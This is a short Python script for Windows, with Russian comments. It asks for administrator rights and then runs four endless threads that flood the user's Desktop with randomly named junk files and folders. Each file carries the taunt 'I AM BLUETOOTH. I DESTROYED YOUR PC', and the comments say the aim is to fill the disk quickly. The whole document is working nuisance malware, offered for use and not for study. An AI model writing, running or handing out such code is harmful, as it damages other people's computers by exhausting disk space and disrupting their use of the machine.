import os
import sys
import time
import ctypes
import random
import string
import threading

# ==========================================
# ЧАСТЬ 1: ПРОВЕРКА ПРАВ
# ==========================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

# ==========================================
# ЧАСТЬ 2: ГЕНЕРАТОР МУСОРА
# ==========================================

def generate_trash():
    # Путь к рабочему столу (учитываем разных пользователей)
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop_path):
        desktop_path = os.path.join(os.getenv("USERPROFILE"), "Desktop")
    
    if not os.path.exists(desktop_path):
        return # Если даже рабочего стола нет, сваливаем

    # Бесконечный цикл создания мусора
    while True:
        try:
            # Рандомное имя
            name = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
            
            # 50% шанс создать файл, 50% - папку
            if random.choice([True, False]):
                # Создаем файл с мусором
                file_path = os.path.join(desktop_path, f"TRASH_{name}.txt")
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write("I AM BLUETOOTH. I DESTROYED YOUR PC. HAHAHAHA >:D\n")
                    f.write("THIS FILE IS USELESS. DELETE IT.\n")
                    f.write("M" * random.randint(1000, 5000)) # Забиваем мусором
            else:
                # Создаем пустую папку
                folder_path = os.path.join(desktop_path, f"FOLDER_{name}")
                os.makedirs(folder_path, exist_ok=True)
            
            # Задержка (чтобы комп не завис моментально, а то неинтересно)
            time.sleep(0.05) 
            
        except Exception:
            pass # Если диск переполнился или ошибка прав - идем дальше

# ==========================================
# ЧАСТЬ 3: ЗАПУСК
# ==========================================

def main():
    if not is_admin():
        run_as_admin()
        return

    # Запускаем создание мусора в 4 потока, чтобы завалить диск быстрее
    for _ in range(4):
        threading.Thread(target=generate_trash, daemon=True).start()
    
    # Держим скрипт активным (или создаем видимость работы)
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
